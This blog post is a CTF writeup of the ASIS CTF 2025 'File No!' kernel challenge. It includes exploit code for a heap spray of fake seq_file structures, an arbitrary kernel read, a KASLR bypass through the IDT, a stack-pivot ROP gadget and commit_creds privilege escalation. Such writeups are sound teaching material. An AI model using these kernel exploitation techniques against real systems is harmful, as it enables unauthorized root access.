---
layout: post
title: ASIS CTF 2025 File No! Writeup
date: 2025-09-06 15:09:00
description: Solving the File No! challenge from ASIS CTF 2025
tags: ctf kernel pwn
categories: writeup
---

So, I've finally gotten around to trying out a kernel pwning challenge.

I picked this one mostly because there weren't many people working on it and I thought it would be a good learning experience.
And I certainly learned a lot.

Full disclosure, ChatGPT did help me with understanding some of the kernel stuff.
But it also turns out that its pretty bad at coming up with an exploit strategy (at least for this challenge).

## The challenge
We're given all the usual stuff for a kernel challenge including the `bzImage`, `rootfs.ext4`, a `run` script and the source code for the vulnerable kernel module.

Here's the important bit from the module:
```c
typedef struct {
  int fd;
  long val;
} req_t;

static long module_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
  req_t req;
  struct file *target = NULL;
  long ret = 0;

  if (cmd != CMD_READ && cmd != CMD_WRITE) {
    return -EINVAL;
  }

  if (copy_from_user(&req, (req_t __user *)arg, sizeof(req))) {
    return -EFAULT;
  }

  mutex_lock(&module_lock);

  if (!(target = fget(req.fd))) {
    ret = -EBADF;
    goto unlock_on_fail;
  }

  if (!S_ISREG(file_inode(target)->i_mode)) {
    ret = -EBADF;
    goto unlock_on_fail;
  }

  if (cmd == CMD_READ) {
    req.val = (long)target->private_data;                         // <--- BUG HERE
    if (copy_to_user((req_t __user *)arg, &req, sizeof(req))) {
      ret = -EFAULT;
      goto unlock_on_fail;
    }
  } else {
    target->private_data = (void*)req.val;                        // <--- BUG HERE
  }

 unlock_on_fail:
  if (target) {
    fput(target);
  }

  mutex_unlock(&module_lock);
  return ret;
}
```

What this module basically does is, it allows the user to read or write a `void *private_data` member in a `struct file` which I assumed would be something that can store any extra data.

After consulting with ChatGPT, I learned that this `private_data` pointer is just a `NULL` pointer for regular files on disk, but for special files like the ones in `/proc/`, this pointer points to a special `struct seq_file` structure.

This can easily be confirmed quickly by opening a file like `/proc/self/maps` and using its fd to read the `private_data` pointer using the module's `CMD_READ` command and comparing it with a regular file.

<pre>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">./exploit</span>
<span style="color:#ccc;">Opening vulnerable device</span> <span style="color:#f96;">/dev/vuln.ko</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(fd = 2)</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(fd = 3)</span>
<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/proc/self/maps</span> <span style="color:#aaa;">(request.fd = 2)</span>
<span style="color:#9f9;">Val = ffff8ab001b67000</span>                 <----- Leaked private_data pointer for /proc/self/maps
<span style="color:#ccc;">Sending ioctl to read from</span> <span style="color:#f96;">/exploit.c</span> <span style="color:#aaa;">(request.fd = 3)</span>
<span style="color:#9f9;">Val = 0</span>                                <----- NULL pointer for regular file
</pre>

So, this confirms that the `private_data` pointer for `/proc/self/maps` is indeed a valid pointer to a `struct seq_file`.
With this knowledge, the next step is to figure out how to fake a `struct seq_file` to get the flag.

The flag is mounted into the VM as a drive:
```bash
-drive file=/tmp/flag.txt,format=raw,index=1
```

It's available inside the VM as `/dev/sdb`
<pre>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">whoami</span>
<span style="color:#f96;">root</span>
<span style="color:#6c6;">~ $</span> <span style="color:#69f;">cat /dev/sdb</span>
<span style="color:#f96;">FLAG{dummy}</span>
</pre>

So, our objective is to just run `cat /dev/sdb` as root.


## The struct seq_file

The `struct seq_file` has a relatively simple layout:
```c
struct seq_file {
    char *buf;                        // Pointer to a buffer
...                                   // A bunch of size_t integers
    const struct seq_operations *op;  // Pointer to seq_operations
...
};
```

I've only included the really important members here.
The `buf` member is a pointer to a buffer which is essentially used for buffering some data.
The `op` member points to a `struct seq_operations` which is a struct of function pointers.

With a fake `struct seq_file`, we can control the `buf` pointer and the `op` pointers which would theoretically provide us with PC control and arbitrary read primitives.

## Strategy

For some reason, I found that the flag was in the memory of my VM.
I could see it when I ran `search-pattern FLAG` in GDB.
So my idea was to just read the memory of the kernel to find the flag.
And so I spent some time working on the arbitrary read primitive.


At the same time, @zolutal and @dbena were not able to find the flag in memory on their machines (I have no idea why), and so they were working on a ROP chain to call `cat /dev/sdb` which would be invoked using the PC control primitive.
However, since we did not have a kernel text leak, this would have to involve some brute-forcing.
According to @zolutal, this would be a 1/512 chance of success.

## Arbitrary read

### Heap spray
In order to craft a fake `struct seq_file` and overwrite the `private_data` pointer to this fake structure, I needed to first make sure that the fake structure would be present at some offset from the leaked `private_data` pointer.

@zolutal suggested that simply creating a bunch of mmaped pages and filling them with fake `struct seq_file` structures would be a good way to do this.
And so I ended up with this code to do the heap spray:
```c
  // This is where I found the flag in memory using GDB
  size_t flag_addr = 0xffff888002ede000;

  // Spray fake seq structures
  // Two 0xdeadbeefcafebabe values are for me to find the sprayed structures in memory
  seq_t fake_seq = {(void *)flag_addr, 0x100, 0, 0, 0, 0, 0, NULL, (void *)0xdeadbeefcafebabe, 0, NULL, (void *)0xdeadbeefcafebabe};

  int i = 0;
  for (i = 0; i < 5000; i++) {
    seq_t *spray = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spray == MAP_FAILED) {
      perror("mmap");
      return 1;
    }
    memcpy((void *)spray, (void *)&fake_seq, sizeof(seq_t));
  }

  puts("Finished spray");
```
I found that this was enough to put a fake structure at an offset of `-0x42e000` from the leaked `private_data` pointer.

### Leaking memory

My plan for the arbitrary read was to craft a fake `struct seq_file` with the `buf` pointing to the address where the flag was located in memory and then to use the `seq_read` function to read the flag into user space.

In order to do that, I had to avoid any of the `ops` functions from being invoked as that would just crash.
And I found this part of the `seq_read_iter` function (called by `seq_read` to actually do the reading) which avoids the `ops` functions.
```c
    /*
     * if request is to read from zero offset, reset iterator to first
     * record as it might have been already advanced by previous requests
     */
    if (iocb->ki_pos == 0) {                     // <------- HAVE TO AVOID THIS
        m->index = 0;
        m->count = 0;
    }
...
    // something left in the buffer - copy it out first
    if (m->count) {                             // <------- OTHERWISE THIS BRANCH WILL NOT BE TAKEN
        n = copy_to_iter(m->buf + m->from, m->count, iter);
        m->count -= n;
        m->from += n;
        copied += n;
        if (m->count)	// hadn't managed to copy everything
            goto Done;
```

I found that I just needed to update my fake `struct seq_file` with the following data:
```c
  fake_seq.buf = (void *)flag_addr;
  fake_seq.from = 0;
  fake_seq.count = 0x1000;
  fake_seq.size = 0x1000;
  fake_seq.read_pos = 1;
```

And combined with an lseek, I could trigger the branch that executes the `goto Done;` thus avoiding any of the `ops` functions.
```c
  // leak_addr comes from the CMD_READ ioctl
  uint64_t leak_page = leak_addr & ~0xfff;
  uint64_t offset = 0x42e000;
  uint64_t fake_seq_addr = leak_page - offset;

  request.val = fake_seq_addr;

  printf("Overwriting private_data with %p\n", (void *)request.val);
  if ( ioctl(vuln_fd, CMD_WRITE, &request) < 0) {
    perror("ioctl");
    return 1;
  }

  char flag_buf[0x100] = {0};
  lseek(fd, 1, SEEK_SET);
  read(fd, (void *)flag_buf, 0x100);

  printf("FLAG %s\n", flag_buf);
```

And this was working and printing the flag on my machine:
<pre>
<span style="color:#6c6;">#</span> <span style="color:#69f;">./exploit</span>
<span style="color:#ccc;">Opening vulnerable device...</span>
<span style="color:#ccc;">Opening</span> <span style="color:#f96;">/proc/self/maps...</span>
<span style="color:#ccc;">Sending ioctl to read from sys file</span>
<span style="color:#9f9;">Private data leak = 0xffff888002f67b40</span>
<span style="color:#ccc;">Finished spray</span>
<span style="color:#9f9;">Overwriting private_data with 0xffff888002b39000</span>
<span style="color:#ff5555;font-weight:bold;">FLAG FLAG{dummy}</span>
</pre>


But this wasn't working on anyone else's machine.
However, I could just replace the `flag_addr` with any address that I wanted to read which was basically an arbitrary read primitive.

## It's ROP time
By the time I had gotten to this point, @zolutal and @dbena had come up with a ROP chain to call `cat /dev/sdb` using the PC control primitive.

### Leaking kernel base
After asking @zolutal and @kylebot, it turns out that there's an area of the kernel which is not randomized.
The Interrupt Descriptor Table (IDT), apparently is always at the address `0xfffffe0000000000`.

According to @zolutal, everything in the CPU Entry Area is randomized except for this IDT.
Now this IDT is a table of `struct idt_entry` elements.
And each `struct idt_entry` has a layout like this:
<pre>
<span style="color:#69f;">offset</span>  <span style="color:#69f;">size</span>  <span style="color:#69f;">field</span>
<span style="color:#aaa;">------  ----  ----------------------------</span>
<span style="color:#6c6;">0x00</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset0</span>      <span style="color:#aaa;">(addr bits 0..15)</span>
<span style="color:#6c6;">0x02</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">selector</span>
<span style="color:#6c6;">0x04</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">ist:type:dpl:p</span>  <span style="color:#aaa;">(attributes word)</span>
<span style="color:#6c6;">0x06</span>     <span style="color:#9f9;">2</span>    <span style="color:#f96;">offset1</span>      <span style="color:#aaa;">(addr bits 16..31)</span>
<span style="color:#6c6;">0x08</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">offset2</span>      <span style="color:#aaa;">(addr bits 32..63)</span>
<span style="color:#6c6;">0x0c</span>     <span style="color:#9f9;">4</span>    <span style="color:#f96;">reserved</span>
</pre>


By reading the first element of the IDT, we can get a pointer to the kernel text segment which defeats KASLR.
We don't need the whole `struct idt_entry` to do this, just the bytes from 4 to 12 which contains the `<offset2:4bytes><offset1:2bytes><ist:type:dpl:p:2bytes>` which gives us all but the last 2 bytes of the address.
And since the kernel text base is aligned to a 2MiB boundary, the last 2 bytes are always `0x0000`.

So my script was now updated to do this:
```c
  // IDT (0xfffffe0000000000) + 4
  size_t flag_addr = 0xfffffe0000000004;
...
...
  char flag_buf[0x100] = {0};
  lseek(fd, 1, SEEK_SET);
  read(fd, (void *)flag_buf, 0x100);

  // -0x8e00 to zero-out the last 2 bytes
  uint64_t kaslr = *((uint64_t*)flag_buf)-0x8e00;
```

### ROP chain
Since we had already sprayed a bunch of `struct seq_file` structures, we could just update them in order to place correct `seq_operations` pointers within them.

When any of the `ops` functions are called, the first argument is always a pointer to the `struct seq_file`.
So, if we could find a gadget that can move the value of `rdi` into `rsp`, we could pivot the stack into a ROP chain.

And surprisingly, there was this gadget in the kernel:
<pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">x/6i 0xffffffff814b1a35</span>
   <span style="color:yellow">0xffffffff814b1a35</span>:	<span style="color:lightblue;font-weight:bold">push</span>   <span style="color:white">rdi</span>
   <span style="color:yellow">0xffffffff814b1a36</span>:	<span style="color:lightblue;font-weight:bold">mov</span>    <span style="color:white">ebx</span>,<span style="color:orange">0x415bfffa</span>
   <span style="color:yellow">0xffffffff814b1a3b</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rsp</span>
   <span style="color:yellow">0xffffffff814b1a3c</span>:	<span style="color:lightblue;font-weight:bold">cdqe</span>
   <span style="color:yellow">0xffffffff814b1a3e</span>:	<span style="color:lightblue;font-weight:bold">pop</span>    <span style="color:white">rbp</span>
   <span style="color:yellow">0xffffffff814b1a3f</span>:	<span style="color:lightblue;font-weight:bold">ret</span>
</pre>


Which does exactly that.


### Privlege Escalation
The first thing I remember from my kernel exploitation reading was that the `commit_creds(prepare_kernel_cred(0))` was the way to go for privilege escalation.
However, it turns out that we could just re-use a creds structure from an existing process.

The `struct task_struct` has two pointers to `struct cred` structures followed by a `comm` buffer.
```c
    /* Objective and real subjective task credentials (COW): */
    const struct cred __rcu		*real_cred;

    /* Effective (overridable) subjective task credentials (COW): */
    const struct cred __rcu		*cred;

    /*
     * executable name, excluding path.
     *
     * - normally initialized begin_new_exec()
     * - set it with set_task_comm()
     *   - strscpy_pad() to ensure it is always NUL-terminated and
     *     zero-padded
     *   - task_lock() to ensure the operation is atomic and the name is
     *     fully updated.
     */
    char				comm[TASK_COMM_LEN];
```

Now, for the `init_task`, the comm is `swapper`.
So if we search the memory in GDB for `swapper`, we can find the `real_cred` and `cred` pointers just before this string which give us the pointer to a `struct creds` for the `init` process which is running as root.

<pre>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">search-pattern swapper</span>
<span style="color:gray">[+] Searching 'swapper' in memory</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001a00000</span>-<span style="color:yellow">0xffff888001caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffff888001c2533e</span> - <span style="color:yellow">0xffff888001c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffff888001caf000</span>-<span style="color:yellow">0xffff8880020dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffff888001e0ca50</span> - <span style="color:yellow">0xffff888001e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81a00000</span>-<span style="color:yellow">0xffffffff81caf000</span><span style="color:gray">), permission=r--</span>
  <span style="color:yellow">0xffffffff81c2533e</span> - <span style="color:yellow">0xffffffff81c25345</span>  →   <span style="color:lightblue">"swapper"</span>
<span style="color:gray">[+] In (</span><span style="color:yellow">0xffffffff81caf000</span>-<span style="color:yellow">0xffffffff820dc000</span><span style="color:gray">), permission=rw-</span>
  <span style="color:yellow">0xffffffff81e0ca50</span> - <span style="color:yellow">0xffffffff81e0ca59</span>  →   <span style="color:lightblue">"swapper/0"</span>
<span style="color:cyan">(remote) gef➤</span> <span style="color:lightgreen">tele 0xffffffff81e0ca50-0x10</span>
<span style="color:yellow">0xffffffff81e0ca40</span>│+0x0000: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ real_cred</span>
<span style="color:yellow">0xffffffff81e0ca48</span>│+0x0008: <span style="color:green">0xffffffff81e3bf60</span>  →  <span style="color:orange">0x0000000000000004</span>    <span style="color:gray">&lt;------ cred</span>
<span style="color:yellow">0xffffffff81e0ca50</span>│+0x0010: <span style="color:lightblue">"swapper/0"</span>                                  <span style="color:gray">&lt;------ comm</span>
<span style="color:yellow">0xffffffff81e0ca58</span>│+0x0018: <span style="color:orange">0x0000000000000030</span> (<span style="color:lightblue">"0"?</span>)
<span style="color:yellow">0xffffffff81e0ca60</span>│+0x0020: <span style="color:orange">0x0000000000000000</span>
</pre>


So, all we need to do is just call `commit_creds(0xffffffff81e3bf60)` to become root.

### The final touches
With some magic about `swapgs` and `iretq` as perfectly explained by lkmidas [here](https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/), all we had to do was to return to user space properly and run `cat /dev/sdb`.

It also turns out that the VM has a libc inside it.
So we don't need to compile the exploit statically which significantly reduces the size of the binary.
Still, with some `gzip` + `base64` magic, @zolutal was able to run the exploit on the remote machine and got the flag.

The final exploit code is available <a href="/assets/c/asis/exploit.c">here</a>.
And the challenge files are available <a href="/assets/binary/asis/vuln.tar.gz">here</a>.


## Extra Credit
After the CTF, I saw @kylebot and @zolutal talk about other writeups for this challenge and @kylebot mentioned that some writeup managed to use the CPU Entry Area.
Apparently, there's a special instruction called `sgdt` which can return the pointer to the randomized CPU Entry Area (thus defeating KASLR).
But, on modern kernels (<6.2), this instruction is not allowed because of the 11th bit in the `CR4` register called `UMIP` (User-Mode Instruction Prevention).
However, this mitigation isn't implemented in QEMU (when its using TCG) and so it can be used to leak the CPU Entry Area address.
Their solution involved storing the fake `struct seq_file` in the CPU Entry Area, followed by using the `sgdt` instruction to get the address of the fake structure which is then used to overwrite the `private_data` pointer.

Additionally, this challenge would not panic on warnings, and so it would have been possible to just leak a kernel pointer using a warning.
Maybe I'll think of these the next time I try a kernel challenge.

I recommend reading their writeup which is available <a href="https://kqx.io/writeups/fileno/">here</a>.
